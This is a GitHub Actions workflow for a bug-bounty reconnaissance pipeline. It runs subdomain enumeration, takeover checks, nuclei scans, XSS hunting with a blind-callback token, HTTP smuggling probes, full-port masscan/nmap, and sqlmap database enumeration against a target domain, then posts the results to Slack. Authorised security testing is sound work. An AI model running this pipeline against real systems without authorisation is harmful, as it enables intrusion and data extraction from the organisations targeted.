#Important Note:
# Before running this action, make sure you updated following secrets variables in settings.
#  1. TARGET_DOMAIN
#       example.com
name: BB Public Program
on:
  workflow_dispatch:
env:
      TARGET: ${{ secrets.PUBLIC_DOMAIN }}
      HOST: ${{ secrets.NGROK_URL }}
      TARGET_IGNORE_HOSTS: ${{ secrets.TARGET_IGNORE_HOSTS_LIST }}
      TARGET_IGNORE_IPS: ${{ secrets.TARGET_IGNORE_IPS_LIST }}
      XSS_HUNTER_URL_TOKEN: ${{ secrets.XSS_HUNTER_BLIND_URL_TOKEN }}
      SLACK_OAUTH_TOKEN: ${{ secrets.SLACK_OAUTH_USER_TOKEN }}
      SLACK_CHANNEL_NAME: ${{ secrets.PUBLIC_SLACK_CHANNEL_NAME }}

jobs:

#Subdomain Enumeration on specified target.  
  subdomain-enumeration:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2             
      - name: Install Dependencies
        run: |
         wget --quiet $HOST/subdomains-exclude.txt
         go get -u github.com/tomnomnom/assetfinder && cp /home/runner/go/bin/assetfinder .
         wget --quiet https://github.com/projectdiscovery/httpx/releases/download/v1.0.3/httpx_1.0.3_linux_amd64.tar.gz && tar -xvf httpx_1.0.3_linux_amd64.tar.gz
         sudo snap install amass
         wget --quiet https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64 && mv jq-linux64 jq && chmod +x jq
         wget --quiet https://github.com/Findomain/Findomain/releases/download/2.1.5/findomain-linux && mv findomain-linux findomain && chmod +x findomain
         wget --quiet https://github.com/projectdiscovery/subfinder/releases/download/v2.4.5/subfinder_2.4.5_linux_amd64.tar.gz && tar -xzvf subfinder_2.4.5_linux_amd64.tar.gz
         wget --quiet https://raw.githubusercontent.com/ValluvarSploit/Resolver/main/resolvers.txt
         chmod +x binaries/shuffledns
         git clone https://github.com/blechschmidt/massdns.git ; cd massdns/ ; make ; sudo mv bin/massdns /usr/bin/massdns       
      - name: Amass
        run: amass enum -passive -d "$TARGET" >> subdomains-all.txt
      - name: Assetfinder
        run: ./assetfinder --subs-only "$TARGET" -silent >> subdomains-all.txt           
      - name: Findomain
        run: ./findomain -t "$TARGET" -q >> subdomains-all.txt    
      - name: Subfinder
        run: |
         ./subfinder -d "$TARGET" -all --silent >> subdomains-all.txt
         echo Total Discovered Subdomains: $(cat subdomains-all.txt | wc -l)
      - name: ShuffleDNS
        run: ./binaries/shuffledns -d "$TARGET" -w wordlists/subdomain-wordlists.txt -r resolvers.txt -v -o shuffledns-brute.txt 
      - name: Unique subdomains
        run: |
         cat shuffledns-brute.txt >> subdomains-all.txt
         cat subdomains-all.txt | sed 's/\*\.//g' | sort -u > subdomains-uniq.txt
         echo Total Uniq Subdomains: $(cat subdomains-uniq.txt | wc -l)
         grep -vFf subdomains-exclude.txt subdomains-uniq.txt > subdomains.txt
         echo Total Subdomains to do Recon: $(cat subdomains.txt | wc -l)       
      - name: HTTP/HTTPS Resolver
        run: |
         cat subdomains.txt | ./httpx -follow-redirects -status-code -vhost -threads 300 -silent | sort -u | grep "[200]" | cut -d [ -f1 | sort -u | sed 's/[[:blank:]]*$//'
         ./httpx -l live-hosts-output.txt -o httpx-subdomains-output.txt -threads 10000 -silent -stats
         cat httpx-subdomains-output.txt | cut -d "/" -f 3 | tee -a live-httpx-hosts.txt
      
      - name: Artifact Files
        run: |
         cp httpx-subdomains-output.txt live-ips-output.txt live-httpx-hosts.txt bbp-public-artifacts/
      
      - name: Upload BBP-Public Artifacts
        uses: actions/upload-artifact@v2
        with:
         name: bbp-public-artifacts-uploaded
         path: bbp-public-artifacts/
      
#Subdomain Takeover on specified targets.
  subdomain-takeover:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-uploaded

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN"
         cat httpx-subdomains-output.txt | head
         
      - name: Install Dependencies
        run: |
         go get -u -v github.com/lukasikic/subzy && cp /home/runner/go/bin/subzy .
         go get -v github.com/haccer/subjack && cp /home/runner/go/bin/subjack .
         git clone https://github.com/projectdiscovery/nuclei-templates.git
         wget --quiet https://github.com/projectdiscovery/nuclei/releases/download/v2.2.0/nuclei_2.2.0_linux_amd64.tar.gz && tar -xzvf nuclei_2.2.0_linux_amd64.tar.gz
      
      - name: Subzy
        run: |
         ./subzy --targets=httpx-subdomains-output.txt -concurrency 50 | tee subzy-logs.txt
         cat subzy-logs.txt | grep -v "NOT VULNERABLE" > subzy-output.txt
      
      - name: Subjack
        run: |
         ./subjack -w httpx-subdomains-output.txt -t 100 -timeout 30 -o subjack-logs.txt -v -c /home/runner/go/src/github.com/haccer/subjack/fingerprints.json
         cat subjack-logs.txt | grep -v "Not Vulnerable" | tee subjack-output.txt
                 
      - name: Nuclei
        run: |
         ./nuclei -l httpx-subdomains-output.txt -c 100 -stats -t nuclei-templates/subdomain-takeover/ -o nuclie-output.txt
                
      - name: Combine Output Files
        run: |
         if [[ -f subzy-output.txt ]]; then echo "*****Subzy*****" > "$TARGET_DOMAIN"-subdomain-takeover-results.txt; cat subzy-output.txt >> "$TARGET_DOMAIN"-subdomain-takeover-results.txt; fi
         if [[ -f subjack-output.txt ]]; then echo "*****Subjack*****" >> "$TARGET_DOMAIN"-subdomain-takeover-results.txt; cat subjack-output.txt >> "$TARGET_DOMAIN"-subdomain-takeover-results.txt; fi
         if [[ -f nuclie-output.txt ]]; then echo "*****Nuceli*****" >> "$TARGET_DOMAIN"-subdomain-takeover-results.txt; cat nuclie-output.txt >> "$TARGET_DOMAIN"-subdomain-takeover-results.txt; fi
      
      - name: Send Output Files Slack Channel
        run: |
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-Subdomain-Takeover-Results -F filename="$TARGET_DOMAIN"-bbp-public-subdomain-takeover.txt -F file=@"$TARGET_DOMAIN"-subdomain-takeover-results.txt
      
#Scan for low hanging fruits on specified targets.
  nuclei-scan:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-uploaded

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN"
         cat httpx-subdomains-output.txt | head

      - name: Install Dependencies
        run: |
         git clone https://github.com/projectdiscovery/nuclei-templates.git
         wget https://github.com/projectdiscovery/nuclei/releases/download/v2.2.0/nuclei_2.2.0_linux_amd64.tar.gz && tar -xzvf nuclei_2.2.0_linux_amd64.tar.gz
                 
      - name: Nuclei scan
        run: |
         ./nuclei -l httpx-subdomains-output.txt -c 500 -stats -t nuclei-templates/ -exclude nuclei-templates/fuzzing/wp-plugin-scan.yaml -exclude nuclei-templates/fuzzing/basic-auth-bruteforce.yaml -exclude nuclei-templates/default-credentials/ -o nuclie-scan.txt
                 
      - name: Send Output Files Slack Channel
        run: |
         if [[ -f nuclie-scan.txt ]]; then curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-BBP-Public-Nuclei-Results -F filename="$TARGET_DOMAIN"-bbp-public-nuclie-scan.txt -F file=@nuclie-scan.txt; fi

#Broken Link Hijacking on specified targets.
  broken-link-hijacking:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
       
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-uploaded
        
      - name: Install Dependencies
        run: |
         sudo npm install broken-link-checker -g

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN"

      - name: blh
        run: |
         while read url ; do printf "Site: $url" | tee -a blh-output.txt; blc -rof --filter-level 3 $url | tee -a blh-output.txt; done < httpx-subdomains-output.txt

      - name: Send Output Files Slack Channel
        run: |
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-Broken-Link-Hijacker-Results -F filename="$TARGET_DOMAIN"-blh.txt -F file=@blh-output.txt

#Collect URLs of specified targets.
  url-collector:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
 
    steps:
      - uses: actions/checkout@v2

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN"
         
      - name: Input Files
        run: |
         echo "$TARGET_IGNORE_HOSTS" > ignore-hosts.txt
         
      - name: Install Dependencies
        run: |
         go get -u github.com/tomnomnom/gf && cp /home/runner/go/bin/gf .
         git clone https://github.com/1ndianl33t/Gf-Patterns && mkdir ~/.gf && cp -r Gf-Patterns/*.json ~/.gf/
         wget --quiet https://github.com/tomnomnom/qsreplace/releases/download/v0.0.1/qsreplace-linux-386-0.0.1.tgz && tar xvf qsreplace-linux-386-0.0.1.tgz
         go get github.com/tomnomnom/waybackurls && cp /home/runner/go/bin/waybackurls .
         wget --quiet https://github.com/lc/gau/releases/download/v1.1.0/gau_1.1.0_linux_amd64.tar.gz && tar xvf gau_1.1.0_linux_amd64.tar.gz

      - name: waybackurls
        run: |
         ./waybackurls "$TARGET_DOMAIN" | tee waybackurls-output.txt 

      - name: gau
        run: |
         echo "$TARGET_DOMAIN" | ./gau | tee gau-output.txt
                
      - name: Combine Output Files
        run: |
         cat waybackurls-output.txt gau-output.txt | tee all-urls-tmp.txt
         grep -vf ignore-hosts.txt all-urls-tmp.txt > all-urls.txt
         sort -u all-urls.txt -o all-urls.txt
         cat all-urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | tee temp-output.txt
         cat temp-output.txt | ./qsreplace FUZZ | tee -a all-urls-unqiue.txt
 
      - name: Patterns
        run: |
         mkdir bbp-public-artifacts-url-collector
         cat all-urls.txt | ./gf interestingEXT | tee -a bbp-public-artifacts-url-collector/interestingEXT-params.txt
         cat all-urls.txt | ./gf jsvar | tee -a bbp-public-artifacts-url-collector/jsvar-params.txt          
         cat all-urls-unqiue.txt | ./gf interestingparams | tee -a bbp-public-artifacts-url-collector/interestingparams-params.txt
         cat all-urls-unqiue.txt | ./gf xss | tee -a bbp-public-artifacts-url-collector/xss-params.txt
         cat all-urls-unqiue.txt | ./gf sqli | tee -a bbp-public-artifacts-url-collector/sqli-params.txt          
         cat all-urls-unqiue.txt | ./gf lfi | tee -a bbp-public-artifacts-url-collector/lfi-params.txt          
         cat all-urls-unqiue.txt | ./gf ssrf | tee -a bbp-public-artifacts-url-collector/ssrf-params.txt          
         cat all-urls-unqiue.txt | ./gf redirect | tee -a bbp-public-artifacts-url-collector/redirect-params.txt          
         cat all-urls-unqiue.txt | ./gf ssti | tee -a bbp-public-artifacts-url-collector/ssti-params.txt          
         cat all-urls-unqiue.txt | ./gf rce | tee -a bbp-public-artifacts-url-collector/rce-params.txt          
         cat all-urls-unqiue.txt | ./gf idor | tee -a bbp-public-artifacts-url-collector/idor-params.txt          
         cat all-urls-unqiue.txt | ./gf debug_logic | tee -a bbp-public-artifacts-url-collector/debug_logic-params.txt
         cat all-urls-unqiue.txt | ./gf img-traversal | tee -a bbp-public-artifacts-url-collector/img-traversal-params.txt
         cat all-urls-unqiue.txt | ./gf interestingsubs | tee -a bbp-public-artifacts-url-collector/interestingsubs-params.txt 

      - name: Upload BBP-Public Artifacts
        uses: actions/upload-artifact@v2
        with:
         name: bbp-public-artifacts-url-collector-uploaded
         path: bbp-public-artifacts-url-collector/     


#Hunt XSS vulnerability on specified target urls.
  xss-hunter:
    runs-on: ubuntu-latest
    needs: [url-collector]
   
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-url-collector

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN"     
         cat xss-params.txt | head 
        
      - name: Install Dependencies
        run: |
         go get -u github.com/tomnomnom/hacks/kxss && cp /home/runner/go/bin/kxss .
         sudo snap install dalfox
                 
      - name: KXSS & Dalfox
        run: |
         cat xss-params.txt | ./kxss | awk '{print $9}' | dalfox pipe -b "$XSS_HUNTER_URL_TOKEN" | tee -a xss-vulnerable-urls.txt
            
      - name: Send Outputs to Slack Channel
        run: |
         count=$(cat xss-vulnerable-urls.txt | wc -w)
         if [[ -f xss-vulnerable-urls.txt ]] && [[ "$count" -gt 0 ]] ; then curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-XSS-Results -F filename="$TARGET_DOMAIN"-xss-poc-urls.txt -F file=@xss-vulnerable-urls.txt; fi

#Hunt HTTP Smuggling Vulnerability on specified urls.
  http-smuggler:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
                                
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-uploaded

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN" 
         cat httpx-subdomains-output.txt | head

      - name: Install Dependencies
        run: |
         git clone https://github.com/defparam/smuggler.git
          
      - name: Smuggler
        run: |
         cat httpx-subdomains-output.txt | python3 smuggler/smuggler.py --log http-smuggler.txt
                 
      - name: Send Files to Slack Channel
        run: |
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-HTTP-Smuggler-Results -F filename="$TARGET_DOMAIN"-http-smuggler.txt -F file=@http-smuggler.txt

#Scan all ports on specified targets and run nmap on masscan results. 
  masscan-nmap:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]             
    
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-uploaded

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN" 
         cat live-ips-output.txt | head

      - name: Install Dependencies
        run: |
         sudo apt-get update && sudo apt-get install nmap -y
         pip install python-libnmap
         sudo apt-get install git gcc make libpcap-dev
         git clone https://github.com/robertdavidgraham/masscan && cd masscan && make -j && cp bin/masscan ../masscanb
           
      - name: Masscan
        run: | 
         sudo ./masscanb -iL live-ips-output.txt --rate 10000 -p1-65535 -oX masscan.xml
                 
      - name: Masscan to Nmap
        run: |
         python masscan_to_nmap.py masscan.xml | tee -a nmap-masscan.txt
                 
      - name: Send File to Slack Channel            
        run: |           
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-Nmap-Masscan-Results -F filename="$TARGET_DOMAIN"-nmap-masscan.txt -F file=@nmap-masscan.txt


  sql-injection:
    runs-on: ubuntu-latest   
    needs: [url-collector]            
    
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-url-collector

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN"
         cat sqli-params.txt | head    
        

      - name: Install Dependencies
        run: |
         git clone https://github.com/sqlmapproject/sqlmap.git
           
      - name: sqlmap
        run: | 
         mkdir sqlmap-output
         python3 sqlmap/sqlmap.py -m sqli-params.txt --batch --banner --dbs --output-dir sqlmap-output
         zip -r sqlmap-output.zip sqlmap-output
                                  
      - name: Send Files to Slack Channel            
        run: |           
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-sqlmap-Results -F filename="$TARGET_DOMAIN"-sqlmap-output.zip -F file=@sqlmap-output.zip
